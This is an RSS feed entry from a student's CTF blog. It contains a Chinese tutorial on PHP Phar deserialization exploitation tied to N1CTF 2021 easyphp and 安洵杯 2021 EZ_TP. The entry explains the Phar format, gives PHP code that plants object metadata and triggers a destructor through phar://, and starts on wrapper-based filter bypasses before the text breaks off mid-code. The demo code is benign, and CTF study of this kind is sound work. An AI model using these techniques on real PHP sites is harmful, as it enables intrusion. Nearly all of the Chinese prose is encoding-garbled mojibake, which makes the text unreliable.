<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Cubic YÂ³ â€¢ Posts by &#34;php&#34; tag</title>
        <link>http://cubicy.icu</link>
        <description>Notes, CTF, DIY, thoughts and waifus.

I&#39;m CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.
â¤â¤â¤ CTF, toy projects, electric guitar
âœ–âœ–âœ– Technological supremacy

RÃ©sumÃ©ğŸ‘‰ [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&amp;target=resume.tex&amp;command=xelatex).</description>
        <language>zh-CN</language>
        <pubDate>Sun, 28 Nov 2021 13:35:00 +0800</pubDate>
        <lastBuildDate>Sun, 28 Nov 2021 13:35:00 +0800</lastBuildDate>
        <category>Misc</category>
        <category>Write-Up</category>
        <category>å‡ºé¢˜</category>
        <category>English</category>
        <category>CISCN</category>
        <category>web</category>
        <category>Hackergame</category>
        <category>SchoolBus</category>
        <category>Overclocking</category>
        <category>Rust</category>
        <category>Lifetime</category>
        <category>Code</category>
        <category>Programming</category>
        <category>å†°è“</category>
        <category>å¤ç±ç ”ç©¶ç¤¾</category>
        <category>Treap</category>
        <category>BST</category>
        <category>å›¾è®º</category>
        <category>Kruskal</category>
        <category>Stack</category>
        <category>Splay</category>
        <category>æ•°é“¾å‰–åˆ†</category>
        <category>æ ‘çŠ¶æ•°ç»„</category>
        <category>LCA</category>
        <category>åˆ†å—</category>
        <category>å“ˆå¸Œ</category>
        <category>æŒä¹…åŒ–</category>
        <category>çº¿æ®µæ ‘</category>
        <category>Phar</category>
        <category>ååºåˆ—åŒ–</category>
        <category>PHP</category>
        <category>NLP</category>
        <category>Fuzzing</category>
        <category>AFL</category>
        <category>Miscellaneous</category>
        <category>On Going</category>
        <category>Math</category>
        <category>Translation</category>
        <category>Yoneda Lemma</category>
        <category>Compiler</category>
        <category>Computer Science</category>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</guid>
            <title>æµ…è°ˆPharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼šN1CTF 2021 easyphp &amp; å®‰æ´µæ¯2021 EZ_TP</title>
            <link>http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</link>
            <category>Phar</category>
            <category>ååºåˆ—åŒ–</category>
            <category>PHP</category>
            <pubDate>Sun, 28 Nov 2021 13:35:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Phar&#34;&gt;&lt;a href=&#34;#Phar&#34; class=&#34;headerlink&#34; title=&#34;Phar&#34;&gt;&lt;/a&gt;Phar&lt;/h1&gt;&lt;h2 id=&#34;ä»€ä¹ˆæ˜¯Phar&#34;&gt;&lt;a href=&#34;#ä»€ä¹ˆæ˜¯Phar&#34; class=&#34;headerlink&#34; title=&#34;ä»€ä¹ˆæ˜¯Phar&#34;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯Phar&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;PHp ARchive, like a Java JAR, but for PHP.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;pharï¼ˆPHp ARchiveï¼‰æ˜¯ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚PHP â‰¥5.3å¯¹Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ­¢èƒ½æ”¾å‹ç¼©æ–‡ä»¶è¿›å»ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨åšè¿›ä¸€æ­¥æ¢ç©¶ä¹‹å‰éœ€è¦å…ˆè°ƒæ•´é…ç½®ï¼Œå› ä¸ºå¯¹äºPharæ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œphpç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´å•çº¯ä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„è°ƒæ•´é…ç½®ï¼‰ã€‚ä½†æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹Â &lt;code&gt;php.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€Â &lt;code&gt;php.ini&lt;/code&gt;ï¼Œæ‰¾åˆ°Â &lt;code&gt;phar.readonly&lt;/code&gt;Â æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;phar.&lt;span class=&#34;keyword&#34;&gt;readonly&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;å³å¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;Pharæ–‡ä»¶æ ¼å¼&#34;&gt;&lt;a href=&#34;#Pharæ–‡ä»¶æ ¼å¼&#34; class=&#34;headerlink&#34; title=&#34;Pharæ–‡ä»¶æ ¼å¼&#34;&gt;&lt;/a&gt;Pharæ–‡ä»¶æ ¼å¼&lt;/h2&gt;&lt;p&gt;Pharæ–‡ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.stub&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;stubæ˜¯pharæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ ¼å¼ä¸º&lt;code&gt;xxxxxx&amp;lt;?php ...;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;ï¼Œxxxxxxå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬ç•™ç©ºï¼Œä¸”phpé—­åˆç¬¦ä¸æœ€åä¸€ä¸ªåˆ†å·ä¹‹é—´ä¸èƒ½æœ‰å¤šäºä¸€ä¸ªçš„ç©ºæ ¼ç¬¦ã€‚å¦å¤–phpé—­åˆç¬¦ä¹Ÿå¯çœç•¥ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.manifest describing the contents&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¯¥åŒºåŸŸå­˜æ”¾pharåŒ…çš„å±æ€§ä¿¡æ¯ï¼Œå…è®¸æ¯ä¸ªæ–‡ä»¶æŒ‡å®šæ–‡ä»¶å‹ç¼©ã€æ–‡ä»¶æƒé™ï¼Œç”šè‡³æ˜¯ç”¨æˆ·å®šä¹‰çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶ç”¨æˆ·æˆ–ç»„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œé¢çš„metadataä»¥serializeå½¢å¼å‚¨å­˜ï¼Œä¸ºååºåˆ—åŒ–æ¼æ´åŸ‹ä¸‹äº†ä¼ç¬”ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.file contents&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¢«å‹ç¼©çš„ç”¨æˆ·æ·»åŠ çš„æ–‡ä»¶å†…å®¹&lt;/p&gt;
&lt;p&gt;4.&lt;strong&gt;signature&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯é€‰ï¼Œpharæ–‡ä»¶çš„ç­¾åï¼Œå…è®¸çš„æœ‰MD5, SHA1, SHA256, SHA512å’ŒOPENSSL.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png&#34; alt=&#34;signature&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™éƒ¨åˆ†ä»¥&lt;code&gt;GBMB&lt;/code&gt;ï¼ˆ47 42 4d 42ï¼‰ç»“å°¾ã€‚&lt;/p&gt;
&lt;p&gt;éœ€è¦æ³¨æ„ï¼Œstubä¸ä¸€å®šè¦åœ¨æ–‡ä»¶å¼€å¤´ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åˆ©ç”¨æ–¹å¼&#34;&gt;&lt;a href=&#34;#åˆ©ç”¨æ–¹å¼&#34; class=&#34;headerlink&#34; title=&#34;åˆ©ç”¨æ–¹å¼&#34;&gt;&lt;/a&gt;åˆ©ç”¨æ–¹å¼&lt;/h2&gt;&lt;p&gt;åœ¨2018 Black Hatä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜&lt;code&gt;Sam Thomas&lt;/code&gt;åˆ†äº«äº†è®®é¢˜&lt;code&gt;Itâ€™s a PHP unserialization vulnerability Jim, but not as we know it&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&#34;&gt;https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„&lt;strong&gt;meta-data&lt;/strong&gt;è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨&lt;strong&gt;æ–‡ä»¶ç³»ç»Ÿå‡½æ•°&lt;/strong&gt;ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ&lt;strong&gt;phar:&amp;#x2F;&amp;#x2F;ä¼ªåè®®&lt;/strong&gt;ï¼Œ&lt;strong&gt;å¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ä¼ å…¥ä»¥ä¸‹å‡½æ•°çš„å‚æ•°ï¼Œå°±æœ‰æ½œåœ¨çš„pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å¯èƒ½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸€äº›åˆ«çš„å‡½æ•°å¯ç”¨ï¼Œå¯å‚è€ƒè¿™ç¯‡ï¼š&lt;a href=&#34;https://www.freebuf.com/articles/web/205943.html&#34;&gt;https://www.freebuf.com/articles/web/205943.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¯•è¯•çœ‹ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆæ¥ç”Ÿæˆä¸€ä¸ªpharï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;TestObject&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;phar.phar&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;phar.phar&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//åç¼€åå¿…é¡»ä¸ºphar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//è®¾ç½®stub&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TestObject&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//ç­¾åè‡ªåŠ¨è®¡ç®—&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æ³¨æ„è¿™è¾¹$oååºåˆ—åŒ–åªä¼šä¿å­˜æ•°æ®ä¸ä¼šä¿å­˜æ–¹æ³•ã€‚æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿpharæ–‡ä»¶çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;GBMBç»“å°¾çš„ç­¾åä»¥åŠåºåˆ—åŒ–åçš„metadataæ¸…æ™°å¯è§ã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;TestObject&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Destruct called&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;phar://phar.phar/test.txt&amp;#x27;&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//æ—¢ç„¶æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¦‚æ­¤è®¿é—®å…¶ä¸­çš„æŸä¸ªæ–‡ä»¶&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;åœ¨ä¸Šé¢çš„ç¨‹åºæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒè¾“å‡ºäº†â€œDestruct calledâ€.è¿™æ˜¯ç”±äºpharè¢«è§£æçš„æ—¶å€™ï¼Œmetadataè¢«ååºåˆ—åŒ–äº†ï¼Œäºæ˜¯è¯¥å®ä¾‹è¢«ææ„æ—¶è°ƒç”¨__destructå‡½æ•°ã€‚è¿™ä¾¿æ˜¯ååºåˆ—åŒ–æ¼æ´çš„æ¥ç”±ã€‚&lt;/p&gt;
&lt;p&gt;PHP â‰¥5.3é»˜è®¤æ”¯æŒpharæ–‡ä»¶ï¼›è€Œåœ¨PHP8ä¸­ï¼Œè¯¥æ¼æ´è¢«ä¿®å¤ï¼šmetadataä¸ä¼šè‡ªåŠ¨è¢«ååºåˆ—åŒ–äº†ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;phar-æ˜¯ä»€ä¹ˆ&#34;&gt;&lt;a href=&#34;#phar-æ˜¯ä»€ä¹ˆ&#34; class=&#34;headerlink&#34; title=&#34;phar:&amp;#x2F;&amp;#x2F;æ˜¯ä»€ä¹ˆ&#34;&gt;&lt;/a&gt;&lt;strong&gt;phar:&amp;#x2F;&amp;#x2F;æ˜¯ä»€ä¹ˆ&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;å‰é¢æåˆ°ï¼Œæˆ‘ä»¬è§£æpharæ–‡ä»¶å¸¸å¸¸ä½¿ç”¨phar:&amp;#x2F;&amp;#x2F;ä¼ªåè®®ã€‚CTFä¸­ï¼Œç”±äºä¼ªåè®®æä¾›äº†ä¸€ç³»åˆ—å¯¹äºæ–‡ä»¶çš„å°è£…åè®®ï¼Œä½¿å¾—å½“æºç¨‹åºæœ‰å¯æ§çš„æ–‡ä»¶åŒ…å«å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æœ‰æœºä¼šåˆ©ç”¨è¿™äº›åè®®æ§åˆ¶å…¶è¿”å›å€¼æˆ–æ˜¯å®Œæˆä¸€äº›é¢„æ–™å¤–æ“ä½œï¼ˆä¾‹å¦‚ååºåˆ—åŒ–ï¼‰ã€‚ä½œä¸ºä¼ªåè®®çš„ä¸€ç§ï¼Œç”±äºpharæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‹ç¼©æ–‡ä»¶ï¼Œæ‰€ä»¥phar:&amp;#x2F;&amp;#x2F;å’Œzip:&amp;#x2F;&amp;#x2F;å…¶å®æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½å¯ä»¥è®¿é—®å‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ï¼Œå¹¶ä¸”zip:&amp;#x2F;&amp;#x2F;éœ€è¦æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œphar:&amp;#x2F;&amp;#x2F;å¹¶ä¸éœ€è¦ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;å°tricks&#34;&gt;&lt;a href=&#34;#å°tricks&#34; class=&#34;headerlink&#34; title=&#34;å°tricks&#34;&gt;&lt;/a&gt;&lt;strong&gt;å°tricks&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&#34;ç»•è¿‡å‰ç¼€è¿‡æ»¤&#34;&gt;&lt;a href=&#34;#ç»•è¿‡å‰ç¼€è¿‡æ»¤&#34; class=&#34;headerlink&#34; title=&#34;ç»•è¿‡å‰ç¼€è¿‡æ»¤&#34;&gt;&lt;/a&gt;ç»•è¿‡å‰ç¼€è¿‡æ»¤&lt;/h3&gt;&lt;p&gt;é˜Ÿé‡Œå¸ˆå‚…çš„å‡ ä¸ªexampleå¯ä»¥ç±»æ¯”ä½¿ç”¨ï¼Œéƒ½æ˜¯åœ¨å‰ç¼€éphar:&amp;#x2F;&amp;#x2F;çš„æƒ…å†µä¸‹è°ƒç”¨äº†phar:&amp;#x2F;&amp;#x2F;&lt;/p&gt;
&lt;p&gt;compress.bzip2å’Œcompress.zlib&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$z&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 